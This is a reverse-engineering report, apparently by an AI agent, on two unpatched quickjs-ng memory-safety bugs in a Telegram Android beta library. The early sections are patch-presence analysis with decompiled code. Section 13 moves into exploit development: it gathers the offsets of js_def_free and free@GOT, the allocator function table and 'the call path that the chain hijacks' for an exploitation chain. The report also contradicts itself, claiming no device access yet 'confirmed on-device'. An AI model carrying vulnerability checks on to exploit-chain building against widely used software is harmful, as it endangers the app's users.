# quickjs-ng binary-presence checks — Telegram Android 13.2.0 beta (72789)

Target : `libtmessages.49.so` (arm64-v8a, 26,997,240 bytes)
Binary : `<HOME>/ailocal/Telegram/.scratch_beta1320/lib/arm64-v8a/libtmessages.49.so`
IDB    : `<HOME>/ailocal/Telegram/.opencode/idbs/libtmessages_49_arm64_widget_annotated.i64`
         (re-opened, annotated, saved in place — see §10)
Date   : 2026-11-01

---

## 0. Verdict

**quickjs-ng issue #1835 / PR #1844 ("Fix use-after-free when freeing a WeakMap with
symbol values", merged 2026-10-30): fix is ABSENT.**

The app links a quickjs-ng whose `js_map_finalizer` is the **pre-fix, single-loop**
version: for every map record it (a) removes the weak reference and (b) frees the value
inside the same loop iteration. The two-pass structure introduced by PR #1844 does not
exist in the binary.

Independently, the engine's atom table dates the build to a master snapshot in
[2026-10-08, 2026-10-30) — i.e. **before** the #1844 merge on 2026-10-30 (§2, corrected
in §12). Both lines of evidence agree.

Consequence: the engine is vulnerable **in principle** to the simple `tests/bug1835.js`
reproducer. No runtime exploitability is claimed here (§8).

---

## 1. Locating `js_map_finalizer`

The previous session left no quickjs symbols, so the finalizer was located through the
static class table instead of by name.

quickjs-ng ≥0.17 registers classes from a table of

```c
typedef struct JSClassShortDef {
    JSAtom class_name;         /* +0x00, uint32 (atom index, NOT a char*) */
    JSClassFinalizer *finalizer; /* +0x08 */
    JSClassGCMark *gc_mark;      /* +0x10 */
} JSClassShortDef;               /* stride 0x18 */
```

Because `class_name` is an **atom index** (not a `const char *`), there are no data
pointers to the class-name strings — the "Map"/"WeakMap"/... strings at `0x29bf4f` /
`0x4108aa` are only reachable through the atom-blob / code immediates. The table itself
is in `.data.rel.ro`:

| item | address |
|---|---|
| `js_std_class_def` base (class id 1 = `JS_CLASS_OBJECT`) | `0x19499d8` |
| index 35..38 = class 36..39 = `JS_CLASS_MAP/SET/WEAKMAP/WEAKSET` | `0x1949d20` .. `0x1949d68` |

```
idx 34 class 35  0x1949d08  atom 187 (JS_ATOM_BigInt)   fin 0x1738140  mark 0x1738194
idx 35 class 36  0x1949d20  atom 190 (JS_ATOM_Map)      fin 0x173899c  mark 0x1738b00
idx 36 class 37  0x1949d38  atom 191 (JS_ATOM_Set)      fin 0x173899c  mark 0x1738b00
idx 37 class 38  0x1949d50  atom 192 (JS_ATOM_WeakMap)  fin 0x173899c  mark 0x0
idx 38 class 39  0x1949d68  atom 193 (JS_ATOM_WeakSet)  fin 0x173899c  mark 0x0
idx 39 class 40  0x1949d80  atom 194 (JS_ATOM_Iterator) fin 0x0        mark 0x0
```

A whole-image scan for this quadruple (2 entries sharing `(finalizer, gc_mark)` followed
by 2 sharing `(finalizer, NULL)`) returns **exactly one hit** → one engine copy, one map
finalizer, shared by Map/Set/WeakMap/WeakSet.

* `js_map_finalizer` = **0x173899c** (356 bytes, xrefs = the 4 table slots only, no code callers)
* `js_map_mark`      = **0x1738b00** (confirmed by decompile: walks `s->records`, calls
  `mark_func` only on object-tagged key/value — matches `assert(!s->is_weak)` variant)
* `js_map_set`       = **0x172f20c** (found via the `"invalid value used as %s key"`
  literal with `"WeakMap"`/`"WeakSet"` at `0x29bf4f`; checks `class_id == magic + 36`,
  i.e. `JS_CLASS_MAP` = 36)

---

## 2. Version fingerprint: this is v0.17.0, not v0.18.0

> **Correction (2026-11-01, see §12):** the atom-index comparison below was off by one
> (atom value = 0-based `DEF()` index + 1). Re-checked, the in-image atom table is
> identical to **v0.18.0's** 240-entry list; the engine is a master snapshot from
> **[2026-10-08, 2026-10-30)**, not the v0.17.0 tag. The §0 verdict is unaffected.

Atom indices are assigned in `quickjs-atom.h` declaration order, so they shift whenever
an atom is added/removed. Computing them from the two release tarballs:

| atom | v0.17.0 | v0.18.0 |
|---|---|---|
| Object | 157 | 156 |
| BigInt | 187 | 186 |
| Map | **190** | 189 |
| Set | **191** | 190 |
| WeakMap | **192** | 191 |
| WeakSet | **193** | 192 |
| Iterator | 194 | 193 |
| DisposableStack (last table entry) | 222 | 221 |

The binary matches **v0.17.0 on every checkpoint** (Object 157 at class 1, BigInt 187 at
class 35, Map..WeakSet 190..193 at classes 36..39, Iterator 194 at class 40, atom 222 at
the end of `js_std_class_def`). v0.18.0 would be shifted by −1 everywhere.

Source comparison (tarballs `v0.17.0` / `v0.18.0`):

* v0.17.0 `js_map_finalizer` — one `list_for_each_safe` loop, `delete_map_weak_ref()`
  and `JS_FreeValueRT(mr->value)` in the same iteration.  ← matches the binary
* v0.18.0 `js_map_finalizer` — `if (s->is_weak) { list_for_each(...) delete_map_weak_ref(); }`
  first pass, then the free loop with `if (!s->is_weak) JS_FreeValueRT(mr->key)`.

So the build carries the engine **at or below v0.17.0**; PR #1844 (merged 2026-10-30)
is not in it.

---

## 3. Code shape of `js_map_finalizer` @ 0x173899c — one loop, pre-fix

Decompiled (Hex-Rays, cleaned):

```c
s = p->u.map_state;                                   // LDR X19,[X1,#0x30]
if (!s) return;
el = s->records.next;                                 // LDR X23,[X19,#0x10]
head = &s->records;                                   // ADD X21,X19,#8
if (el == head) goto free_state;
do {
    el1 = el->next;                                   // LDR X22,[X23,#8]   <-- saved next
    mr  = (JSMapRecord *)((char*)el - 0x10);
    if (!mr->empty) {                                 // LDURB W8,[X23,#-0xC]
        if (s->is_weak) {                             // LDRB W9,[X19]      <-- IN THE LOOP
            /* delete_map_weak_ref() inlined */
            key = mr->key;                            // LDR X8,[X23,#0x20]
            switch (key.tag) {                        // LDR W9,[X23,#0x28]
              case JS_TAG_SYMBOL: pwr = key+0x10; break;   // CMN W9,#8
              case JS_TAG_OBJECT: pwr = key+0x28; break;   // CMN W9,#1
              default: abort();                            // BL .abort
            }
            while (wr = *pwr, !(wr->kind == JS_WEAK_REF_KIND_MAP &&
                                wr->u.map_record == mr))
                pwr = &wr->next_weak_ref;
            *pwr = wr->next_weak_ref;
            js_free_rt(rt, wr);
        } else {
            JS_FreeValueRT(rt, mr->key);              // __JS_FreeValueRT
        }
        JS_FreeValueRT(rt, mr->value);                // value.tag @ X23+0x38, ptr @ X23+0x30
    }
    js_free_rt(rt, mr);                               // 0x17389f4
    el = el1;
} while (el != head);                                 // CMP X22,X21 ; B.EQ 0x17389cc
free_state:
js_free_rt(rt, s->hash_table);                        // 0x17389cc
js_free_rt(rt, s);
```

Control-flow map (the basic blocks that matter):

| block | address | role |
|---|---|---|
| prologue / `el = s->records.next` | `0x17389b0`–`0x17389c4` | `LDR X19,[X1,#0x30]`, `LDR X23,[X19,#0x10]`, `ADD X21,X19,#8` |
| **single loop head** | `0x1738a08` | `LDURB W8,[X23,#-0xC]` (mr->empty), `LDR X22,[X23,#8]` (el1 saved), `SUB X1,X23,#0x10` |
| **`s->is_weak` test (in-loop)** | `0x1738a18` | `LDRB W9,[X19]` — per-record, not hoisted |
| weak-ref unlink (inlined `delete_map_weak_ref`) | `0x1738a24`–`0x1738aa8` | tag switch `-8`/`-1`, walk `first_weak_ref`, unlink, `js_free_rt(wr)` |
| non-weak branch: free key | `0x1738a40`–`0x1738a6c` | `__JS_FreeValueRT(rt, mr->key)` |
| **free value (same iteration)** | `0x1738ab0`–`0x1738ae4` | `__JS_FreeValueRT(rt, mr->value)` then back to `0x17389f4` |
| free record + back-edge | `0x17389f4`–`0x1738a04` | `js_free_rt(rt,mr)`, `CMP X22,X21`, `B.EQ 0x17389cc` |
| free state | `0x17389cc`–`0x17389f0` | `js_free_rt(rt, s->hash_table)`, tail-call `js_free_rt(rt, s)` |

There is exactly **one** loop over `s->records` and **one** backward branch. The
`is_weak` test is not hoisted — post-fix code would show it *before* `0x17389b8` plus a
first pass that only unlinks, and its second loop would have `is_weak` guarding **only**
the key free (value free unconditional). Neither exists here.

---

## 4. Structures (recovered + cross-checked against v0.17.0 source)

`JSMapRecord` (0x50 bytes):

| off | field |
|---|---|
| 0x00 | `int ref_count` |
| 0x04 | `bool empty` |
| 0x08 | `JSMapState *map` |
| 0x10 | `struct list_head link` (`prev` @0x10, `next` @0x18 — quickjs `list.h` is `{prev,next}`) |
| 0x20 | `struct list_head hash_link` |
| 0x30 | `JSValue key` (ptr @0x30, tag @0x38) |
| 0x40 | `JSValue value` (ptr @0x40, tag @0x48) |

`JSMapState`: `+0x00 is_weak`, `+0x08 records` head, `+0x18 record_count`,
`+0x20 hash_table`, `+0x28 hash_size`, `+0x2c record_count_threshold`.

`JSObject`: `u` union at `+0x30` (`p->u.map_state`), `class_id` at `+0x12` (uint16).
Consistent across `js_map_set`, `js_map_mark`, `js_map_finalizer`, `reset_weak_ref`
(`rt->class_array` at `rt+0x480`, `sizeof(JSClassDef)` = 0x28).

---

## 5. `reset_weak_ref` @ 0x16fb42c (found; unmodified, and *not* what #1844 changed)

Identified as the only function in the engine region with exactly one
`__JS_FreeValueRT` call and three `js_free_rt` calls in the right size band, then
confirmed by decompile. Two-pass by design (this is original code, unchanged by #1844):

* pass 1: for each `JSWeakRefRecord` in `*first_weak_ref`, switch on `kind`:
  `MAP(0)` → `list_del(&mr->hash_link)`, `list_del(&mr->link)`, `s->record_count--`;
  `WEAK_REF(1)` → `wrd->target = JS_UNDEFINED` (`*_OWORD = xmmword_1F6C80`);
  `FINREC(2)` → `list_del(&fre->link)`; default → `abort()`.
* pass 2: `MAP` → `JS_FreeValueRT(rt, mr->value)` + `js_free_rt(rt, mr)`;
  `WEAK_REF` → `wrd->obj->u.opaque = &js_weakref_sentinel` (`0x1CB24A0`) +
  `js_free_rt(rt, wrd)`; `FINREC` → enqueue finalization job + `js_finrec_free`;
  then `js_free_rt(rt, wr)`.
* ends with `*first_weak_ref = NULL`.

Callers are inlined copies of the two source call sites (v0.17.0 `JS_FreeAtomStruct`
and `free_object`), e.g. the atom-release block calling
`reset_weak_ref(rt, &p->first_weak_ref)` at `0x16fb400`.

Key ordering fact for the bug: `free_object()` calls `reset_weak_ref()` **before** it
invokes `rt->class_array[p->class_id].finalizer` — so at `js_map_finalizer` entry the
WeakMap's own records are still all present.

---

## 6. `delete_map_weak_ref` / `JS_FreeAtomStruct`

Neither survives as a standalone symbol in this build; both are fully inlined.

* `delete_map_weak_ref(rt, mr)` inline copy inside the finalizer: `0x1738a24`–`0x1738aa8`
  (`get_first_weak_ref` tag switch: `-8` symbol → `+0x10`, `-1` object → `+0x28`,
  otherwise `abort()`; walk `next_weak_ref` for `kind==0 && u.map_record==mr`; unlink;
  `js_free_rt(rt, wr)`). Same shape inside `js_map_delete`/`js_map_clear`.
* `JS_FreeAtomStruct`: not a separate function; inlined into every atom-release path.
  One copy is the tail of `__JS_FreeValueRT` (`0x16fb170`–`0x16fb428`):
  `atom_array[i] = (atom_free_index << 1) | 1` (`rt+0x468`), `atom_free_index = i`
  (`rt+0x470`), `if (p->first_weak_ref) reset_weak_ref(rt, &p->first_weak_ref)` at
  `0x16fb400`, `js_free_rt(p)`, `atom_count--` (`rt+0x454`). Other inlined copies, e.g.
  in `js_function_apply` (`0x1713718`, call at `0x1713a2c`).

---

## 7. Why this is the #1835 hole (concrete, in this binary)

1. GC frees a `WeakMap` → `free_object` → `js_map_finalizer` (`0x173899c`).
2. Loop iteration for record `R1 { key: o, value: V }` where `V` is a `Symbol`.
3. `LDR X22,[X23,#8]` saved `el1` = the *next* record `R2`.
4. `JS_FreeValueRT(rt, V)` at `0x1738adc` drops the last reference → `free_atom` →
   `reset_weak_ref(&V)` at `0x16fb42c` unlinks **and `js_free_rt`s** every record whose
   key is `V` — including `R2` (which is the saved `el1`) and `R2`'s `link` node.
5. Back-edge `0x17389f4`–`0x1738a04` sets `el = el1` (freed) and the next iteration
   dereferences it at `0x1738a08` (`LDURB W8,[X23,#-0xC]`) → **use-after-free**.

With the PR #1844 two-pass order, step 4 cannot free a record that the second loop has
not yet visited.

---

## 8. Limits of this finding

* Static presence only. No claim that a specific widget/JS payload reaches this path,
  and no claim of a reliable primitive. The path requires: a `WeakMap`/`WeakSet` that
  becomes garbage while holding a symbol value that is also a key of the same map
  (exactly `tests/bug1835.js`).
* quickjs-ng accepts symbols as weakmap keys (`is_valid_weakref_target()` in 0.17.0
  accepts `JS_TAG_OBJECT` and `JS_TAG_SYMBOL`, rejecting only `Symbol.for()` global
  symbols; `get_first_weak_ref()` maps symbol → `JSAtomStruct+0x10`, object →
  `JSObject+0x28`, else `abort()`), so nothing app-specific gates the trigger; the
  widget sandbox only has to let script create a `WeakMap` and `Symbol` (both standard,
  present — atoms 190/192 exist, class table entries registered).
* Nothing here touches the device or `cache4.db`.

---

## 9. Post-0.17 markers passed by

* The whole engine fingerprints as **v0.17.0** by atom table (§2), so *every* post-0.17
  fix is absent by construction — not individually verified, and not claimed.
* `reset_weak_ref` already uses the two-pass weak-ref teardown in 0.17.0; that is
  unrelated to #1835/#1844 (the fix is confined to `js_map_finalizer`).
* No second quickjs copy in the APK's arm64-v8a lib dir (single `libtmessages.49.so`),
  and only one map class-table quadruple in the image.

---

## 10. IDB changes (saved in place)

Path: `<HOME>/ailocal/Telegram/.opencode/idbs/libtmessages_49_arm64_widget_annotated.i64`

| address | name / comment |
|---|---|
| `0x173899c` | `js_map_finalizer` (+ comment: pre-fix for #1835, PR #1844 absent) |
| `0x1738b00` | `js_map_mark` |
| `0x16fb42c` | `reset_weak_ref` |
| `0x172f20c` | `js_map_set` |
| `0x172f41c` | `js_map_hash` |
| `0x19499d8` | `js_std_class_def` |
| `0x1949d20` | `js_std_class_def_JS_CLASS_MAP` (+ atom-fingerprint comment) |
| `0x1738a18`, `0x1738ab0` | comments marking the in-loop `is_weak` test and the same-iteration value free |

Verified after save (names/comments readable in the reopened session).

---

## Appendix — sources used

* PR #1844 diff: `https://patch-diff.githubusercontent.com/raw/quickjs-ng/quickjs/pull/1844.diff`
* tarballs: `v0.17.0` (pre-fix) and `v0.18.0` (post-fix) from `codeload.github.com`,
  extracted to `/tmp/opencode/qjs/`

---

## 11. Second check — quickjs-ng PR #1827: `JS_RegExpDelete` lastIndex/bytecode order

Status: PR #1827 opened 2026-10-15, **still unmerged** (not in v0.18.0 either).

**Verdict: vulnerable order PRESENT.** The shipped `JS_RegExpDelete` snapshots
`re->bytecode` and reads `lre_get_flags()` **before** the `lastIndex` coercion, and then
uses that same (possibly dangling) pointer for `lre_get_alloc_count()` and `lre_exec()`.

### 11.1 Locating `JS_RegExpDelete`

| item | value |
|---|---|
| `"out of memory in regexp execution"` | `0x22bac6` (1 occurrence) → xref `0x17656d8` |
| `"corrupted bytecode in regexp execution"` | `0x24046d` (1 occurrence) → xref `0x1765700` in the same function (the other xref, `0x17610d0`, is `js_regexp_exec`) |
| **`JS_RegExpDelete`** | **`0x17651cc`–`0x1765738` (1388 B)**, args `(ctx, this_val.ptr, this_val.tag, arg.ptr, arg.tag)` |
| sole caller | `js_regexp_Symbol_replace` `0x176235c`, call at `0x17628c0` (RegExp.prototype`[Symbol.replace]`, i.e. `"…".replace(re, "")`) |

Shape confirmation: `LDRH W8,[X1,#0x12]; CMP W8,#0x13` → `JS_CLASS_REGEXP` = 19 (class
table slot 19 → atom 171 = `"RegExp"`, finalizer `0x1738804`), then
`string_buffer_init` → `JS_ToString(arg)` → bytecode/flags → lastIndex → `js_malloc(8*alloc_count)`
→ loop with `lre_exec` → `JS_SetProperty(lastIndex,0)` → StringBuffer→string.

Note on the field offset: `JSRegExp` is stored **by value** in `JSObject.u`
(`JSRegExp regexp;` inside `union u` in the 0.17.0 source), so `pattern` sits at
`JSObject+0x30` and `bytecode` at `JSObject+0x38`. `LDR X8,[X23,#0x38]` at `0x1765258`
is therefore `re->bytecode`.

### 11.2 Shipped order — bytecode snapshot before the coercion

| addr | instruction | meaning |
|---|---|---|
| `0x1765244` | `BL sub_170CE84` | `str_val = JS_ToString(ctx, arg)` |
| **`0x1765258`** | **`LDR X8,[X23,#0x38]`** | **`re_bytecode = str8(p->u.regexp.bytecode)`** ← snapshot |
| `0x176525c`–`0x17652b8` | `LDR X9,[X8]; UBFX …; ADD X28,…` | `str8()` decode → `X28` = bytecode bytes |
| **`0x17652c0`** | **`LDRH W9,[X28]`** | **`lre_get_flags(re_bytecode)`** (flags at bc[0..1]) |
| `0x17652c4`–`0x17652d0` | `MOV W8,#0x21; ANDS W20,W9,W8; B.EQ 0x1765364` | `flags & (LRE_FLAG_GLOBAL\|LRE_FLAG_STICKY)`; if zero → `last_index = 0` |
| **`0x17652f0`** | **`BL sub_17087A8`, atom `W3=0x5D`** | **`JS_GetProperty(this, JS_ATOM_lastIndex)`** — user getter can run here |
| `0x1765344` → `0x17653b4` | `BL sub_17156B0` + inline tag dispatch | **`JS_ToLengthFree(ctx,&last_index,val)`** — `valueOf()` runs here (`re.compile()` possible) |
| **`0x17653b8`** | `LDRB W8,[X28,#2]` | `alloc_count = bc[REGISTER_COUNT]` — **stale X28** |
| `0x17653bc`–`0x17653c0` | `LDRB W9,[X28,#3]; ADD X8,X9,X8,LSL#1` | `+ 2*bc[CAPTURE_COUNT]` = `lre_get_alloc_count()` — **stale X28** |
| `0x17653d0` | `BL sub_172880C` | `capture = js_malloc(8*alloc_count)` |
| **`0x1765528`** | **`BL sub_17A9CE4`** | **`lre_exec(capture, re_bytecode, str_buf, last_index, len, shift, ctx)`** with `X1` = the *saved* pointer (`var_58`, reloaded at `0x1765510`) |

`JS_ATOM_lastIndex` = **93**: verified against the in-image atom blob at `0x410274`
(entry index 92 → atom 93); the same blob gives `Map`=190, `RegExp`=171, i.e. atom value =
blob index + 1.

Instruction scan of the whole function (`0x17651cc`–`0x1765738`) finds **exactly one**
access to `[X23,#0x38]` (the `0x1765258` load) — there is **no re-read of `re->bytecode`
after the coercion**, no re-validation, no length/hash check.

### 11.3 Source comparison

v0.17.0 **and** v0.18.0 (`/tmp/opencode/qjs/quickjs-0.18.0/quickjs.c`, same as today's
master — the PR is unmerged):

```c
    str = JS_VALUE_GET_STRING(str_val);
    re_bytecode = str8(re->bytecode);          /* snapshot */
    re_flags = lre_get_flags(re_bytecode);     /* flags read      */
    if ((re_flags & (LRE_FLAG_GLOBAL | LRE_FLAG_STICKY)) == 0) {
        last_index = 0;
    } else {
        val = JS_GetProperty(ctx, this_val, JS_ATOM_lastIndex);   /* can run JS */
        if (JS_IsException(val) || JS_ToLengthFree(ctx, &last_index, val))
            goto fail;
    }
    alloc_count = lre_get_alloc_count(re_bytecode);   /* stale pointer */
```

PR #1827 moves the `JS_GetProperty`+`JS_ToLengthFree` pair **above** the
`str8(re->bytecode)`/`lre_get_flags` lines and always executes it (the flags test then
only decides `last_index = 0`). Its regression test uses exactly
`lastIndex = { valueOf() { regexp.compile("b","g"); … } }` with `"ccc".replace(regexp, "")`.

The binary matches the **un-fixed** order, including the conditional (global/sticky-only)
getter — a fixed build would call the getter unconditionally and *before* the
`[X23,#0x38]` load.

### 11.4 `lre_exec` / `REOP_set_i32`

* `lre_exec` = **`0x17a9ce4`–`0x17ab550` (6252 B)**; callers `js_regexp_exec`
  (`0x1760ac8`) and `JS_RegExpDelete` (`0x1765528`). `lre_exec_backtrack` is inlined
  into it (jump table at `0x17a9e34`).
* `REOP_set_i32` is **opcode 27** (libregexp-opcode.h: invalid=0 … loop=22,
  loop_split_goto_first=23, loop_split_next_first=24, loop_check_adv_split_goto_first=25,
  loop_check_adv_split_next_first=26, **set_i32=27**). IDA labels the block
  `jumptable 00000000017A9E34 case 27` at `0x17aa7e8`:

```
0x17aa7e8  LDR   W8, [SP,#var_12C]      ; s->capture_count
0x17aa7ec  LDRB  W9, [X25,#1]           ; pc[0]  (register index, 0..255)
0x17aa7f0  LDUR  W21,[X25,#2]           ; val = get_u32(pc+1)
0x17aa7f4  ADD   X25,X25,#6             ; pc += 5
0x17aa7f8  ADD   W20,W9,W8,LSL#1        ; idx = pc[0] + 2*capture_count
0x17aa7fc  MOV   X8,X23                 ; sp1 = sp
0x17aa800  CMP   X8,X24                 ; sp1 > bp ?
0x17aa804  B.LS  0x17AAC98              ;   no -> save on stack
0x17aa808  LDR   X9,[X8,#-0x10]!        ; sp1 -= 2
0x17aa80c  CMP   X9,X20                 ; sp1[-2].val == idx ?
0x17aa810  B.NE  0x17AA800
0x17aa814  B     0x17AACB4              ; already saved -> store only
...
0x17aac98  SUB   X8,X2,X23              ; CHECK_STACK_SPACE(2)  <-- only check performed
0x17aac9c  CMP   X8,#0xF
0x17aaca0  B.LE  0x17AB428              ; (stack grow path)
0x17aaca4  STR   X20,[X23]              ; sp[0].val = idx
0x17aaca8  LDR   X8,[X19,X20,LSL#3]     ; sp[1].ptr = capture[idx]   <-- unchecked READ
0x17aacac  STR   X8,[X23,#8]
0x17aacb0  ADD   X23,X23,#0x10
0x17aacb4  STR   X21,[X19,X20,LSL#3]    ; capture[idx] = val         <-- unchecked WRITE
```

There is **no comparison of `idx` against `register_count`, `2*capture_count` or
`alloc_count`** anywhere in the case — matching `SAVE_CAPTURE_CHECK`, which only dedups
the saved-value stack (`sp1[-2].val == idx`) and has no bounds check.

Bounded consequence (no exploitability claim): with well-formed bytecode the compiler
guarantees `pc[0] < register_count`, hence `idx < 2*cc + register_count = alloc_count`.
If the buffer being executed is recycled/dangling (the PR #1827 scenario), `pc[0]` is an
arbitrary byte while `alloc_count` comes from the same buffer, so `capture[idx]` can land
up to ~255 words (≈2 KB) past the `8*alloc_count`-byte `js_malloc` block — one OOB read
(`0x17aaca8`) and one OOB write (`0x17aacb4`).

### 11.5 Limits

Static only. No runtime attempt, no device access. Reaching `JS_RegExpDelete` requires the
`RegExp.prototype[Symbol.replace]` fast path, which the engine gates on
`rp && rp->len == 0 && is_global && js_is_standard_regexp(ctx, rx)` — i.e. the replacement
converts to an **empty string**, the regexp carries the `g` flag, `rx.constructor` is the
real `RegExp` (that property read is itself a JS hook: it is where the PR's reproducer
installs the `lastIndex` object) and `rx.exec` is the built-in `js_regexp_exec`.

Inside `JS_RegExpDelete` the coercion must then run user JS — a `lastIndex` object whose
`valueOf()` re-compiles the regexp (`regexp.compile("b","g")`, plus another `new RegExp`
to recycle the freed block). Whether the widget sandbox exposes `RegExp.prototype.compile`
and permits overriding `lastIndex` is a separate question; the vulnerable ordering in the
engine is present regardless.

Note also that `JS_RegExpDelete`'s own flags test accepts `GLOBAL|STICKY`, so a sticky
regexp reaching this helper by any other route would take the same path.

### 11.6 IDB changes for this round (saved in place)

| address | name / comment |
|---|---|
| `0x17651cc` | `JS_RegExpDelete` (+ comment: PR #1827 order present) |
| `0x176235c` | `js_regexp_Symbol_replace` (sole caller, call at `0x17628c0`) |
| `0x176222c` | `js_regexp_toString` |
| `0x1760690` | `js_regexp_exec` |
| `0x17a9ce4` | `lre_exec` (backtrack inlined) |
| `0x1765258`, `0x17652c0`, `0x17652f0`, `0x17653b8`, `0x1765528` | comments marking snapshot / flags / getter / stale alloc_count / `lre_exec` |
| `0x17aa7e8`, `0x17aacb4` | comments: `REOP_set_i32`, unchecked `capture[idx]` store |

---

## 12. Correction to §2 (engine version fingerprint)

§2 compared 0-based `DEF()` positions in `quickjs-atom.h` with in-image **atom values**
and concluded "exactly v0.17.0". That comparison was off by one (atom value = 0-based DEF
index **+ 1**, because `__JS_ATOM_NULL` = 0 precedes the first `DEF`). Re-done properly
against the in-image atom blob at `0x410274`:

* the image's atom list is **identical to v0.18.0's 240-entry list** (element-wise compare
  over the whole table), and differs from v0.17.0's 241 entries by exactly one atom:
  `DEF(concat, "concat")`, removed by commit `c359cac363` *"Fix template literal
  substitution (#1811)"* on **2026-10-08**;
* `JS_CLASS_MAP..WEAKSET` = atoms 190..193 → `"Map"/"Set"/"WeakMap"/"WeakSet"`, class 19 =
  atom 171 = `"RegExp"` — all consistent with both tags after that commit.

Timeline: v0.17.0 tag 2026-09-18 → atom change 2026-10-08 → **PR #1844 merge 2026-10-30**
→ v0.18.0 tag 2026-11-01T09:52Z. The app (build ~2026-10-31) therefore carries a **master
snapshot in [2026-10-08, 2026-10-30)**: new enough for the atom change, old enough to
predate the #1835 fix. The §0 verdict (#1835 fix ABSENT, confirmed on-device) is
unchanged — it rests on the code shape of `js_map_finalizer`, not on the version number.

`JS_RegExpDelete` is not a version discriminator: v0.17.0, v0.18.0 and master all still
carry the un-fixed order (PR #1827 unmerged), and the binary matches them.

---

## 13. Third check — offsets for the PR #1827 chain: `js_def_free` and `free@GOT`

Short answer (all values are **ELF-base-relative vaddrs**; the `.so` is ET_DYN with its
first `PT_LOAD` at vaddr 0, so runtime address = `libtmessages.49.so` base + value):

| what | vaddr | file offset | note |
|---|---:|---:|---|
| **`js_def_free`** | **`0x1739aec`** | `0x1739aec` | `mov x0,x1 ; b .free(@0x18accf0)` |
| **`free@GOT`** | **`0x1960430`** | `0x195c430` | `R_AARCH64_JUMP_SLOT`, sym `free` (28) |
| `malloc@GOT` (fallback) | `0x1960448` | `0x195c448` | `R_AARCH64_JUMP_SLOT`, sym `malloc` |
| `free` GLOB_DAT slot (alt.) | `0x1955078` | `0x1951078` | `R_AARCH64_GLOB_DAT`, sym `free` |
| `.free` PLT stub | `0x18accf0` | `0x18accf0` | `adrp/ldr x17,[0x1960430]; br x17` |
| `def_malloc_funcs` table | `0x1949f30` | `0x1945f30` | 5 qwords, see §13.3 |
| `JS_NewRuntime` | `0x17395b8` | `0x17395b8` | copies the table into `rt` |
| `js_free_rt` | `0x16fa4fc` | `0x16fa4fc` | indirect call site `0x16fa628` |

### 13.1 `js_def_free` = `0x1739aec`

```
0x1739aec  MOV  X0, X1        ; opaque -> dropped, ptr -> arg0
0x1739af0  B    .free         ; tail-call through the free PLT stub (0x18accf0)
```
bytes (`0x1739aec`, 8 bytes): `e0 03 01 aa 80 cc 05 14`
(`0xaa0103e0` = `mov x0,x1`, `0x1405cc80` = `b` with imm26 `0x5cc80` → `0x1739af0 + 0x5cc80*4 = 0x18accf0`).

Semantics match `static void js_def_free(void *opaque, void *ptr) { free(ptr); }` from
quickjs-ng 0.17.0. There is no explicit NULL check in the wrapper — `free(NULL)` is a
no-op, and `js_free_rt` already returns early on a NULL pointer (`CBZ X1, 0x16fa5dc`).

### 13.2 `free@GOT` = `0x1960430`

* Disassembly of the PLT stub: `0x18accf0 ADRP X16, #0x196000; 0x18accf4 LDR X17,[X16,#0x430]; 0x18accf8 ADD X16,X16,#0x430; 0x18accfc BR X17` → slot **`0x1960430`**.
* ELF `.rela.plt` entry: `r_offset = 0x1960430`, `r_info type = 1026` = **`R_AARCH64_JUMP_SLOT`**, symbol index 28 = `free`. (Slot lives in `.got.plt`, `0x1960340`–`0x1961028`.)
* **BIND_NOW**: `DT_FLAGS = 0xa` (`DF_SYMBOLIC | DF_BIND_NOW`) and `DT_FLAGS_1 = 0x1` (`DF_1_NOW`) ⇒ the slot is resolved **eagerly at load time**, so at runtime it holds the **real libc `free` pointer**, not a lazy resolver stub. Reading it after load is exactly `libc_free`.
* **RELRO**: `PT_GNU_RELRO` = vaddr `0x18b24e0`, size `0xaeb48` → `0x18b24e0..0x1961028`, which covers `.got` (`0x1954ee8`) **and** `.got.plt` (`0x1960340`–`0x1961028`). The page is `mprotect`ed read-only after relocation: **reads are fine, writes would fault**.
* The same symbol also has an `R_AARCH64_GLOB_DAT` slot at `0x1955078` (`free_ptr`, used by code that takes `&free`, e.g. the ffmpeg/av_malloc table in `sub_1564210`). Both slots hold the same resolved libc address; `js_def_free` goes through the JUMP_SLOT one (`0x1960430`).

### 13.3 `JSMallocFunctions` table and `rt->mf.js_free`

`def_malloc_funcs` found by scanning `.data.rel.ro` for five consecutive `.text` pointers
whose targets tail-branch to the `.calloc/.malloc/.free/.realloc/.malloc_usable_size`
PLT stubs — **exactly one hit**, at `0x1949f30`:

```
0x1949f30  0x1739ad8  js_def_calloc            (mov x0,x1; mov x1,x2; b .calloc)
0x1949f38  0x1739ae4  js_def_malloc            (mov x0,x1; b .malloc)
0x1949f40  0x1739aec  js_def_free              (mov x0,x1; b .free)          <-- [2]
0x1949f48  0x1739af4  js_def_realloc           (mov x0,x1; mov x1,x2; b .realloc)
0x1949f50  0x1739b00  js_def_malloc_usable_size(b .malloc_usable_size)
```

`JS_NewRuntime` (`0x17395b8`) — the only runtime constructor referenced by the app
(single xref from `twidget_JSInterruptRuntime_ctor` @ `0x776c70`) — allocates the runtime
with `calloc(1, 0x5f8)` and copies the whole table by value:

```
0x17395ec  ADRL X8, def_malloc_funcs
0x17395f8  LDP  Q0, Q1, [X8]        ; table[0..3]
0x17395fc  LDR  X8, [X8,#0x20]      ; table[4]
0x1739604  STR  X8, [X19,#0x20]     ; rt+0x20 = js_def_malloc_usable_size
0x1739608  STP  Q0, Q1, [X19]       ; rt+0x00 = calloc, rt+0x08 = malloc,
                                    ; rt+0x10 = js_def_free, rt+0x18 = realloc
```

⇒ **`rt->mf.js_free` is at `rt+0x10` and equals `0x1739aec`**, as the chain assumes.
(`rt+0x28..0x40` is `JSMallocState`: `malloc_count` `+0x28`, `malloc_size` `+0x30`,
`malloc_limit` `+0x38`, **`opaque` `+0x40`**, zeroed by `STP XZR,XZR,[X19,#0x38]`.)

### 13.4 The call path that the chain hijacks

`js_free_rt` (`0x16fa4fc`) → large-block path:

```
0x16fa51c  LDRSH W8,[X19,#-8]!      ; block_idx = *(int16*)(ptr-8); X19 = ptr-8
0x16fa520  CMN   W8,#1              ; 0xffff == JS_ARENA_FREE_NIL ?
0x16fa524  B.EQ  0x16fa534
...
0x16fa58c  MOV   W8,#0xffff
0x16fa590  LDRH  W10,[X19]
0x16fa594  CMP   X10,W8
0x16fa598  B.EQ  0x16fa600          ; large block -> generic free
...
0x16fa60c  LDR   X8, [X0,#0x40]     ; arg0 = rt->malloc_state.opaque
0x16fa610  LDR   X2, [X0,#0x10]     ; callee = rt->mf.js_free
0x16fa614  MOV   X0, X8
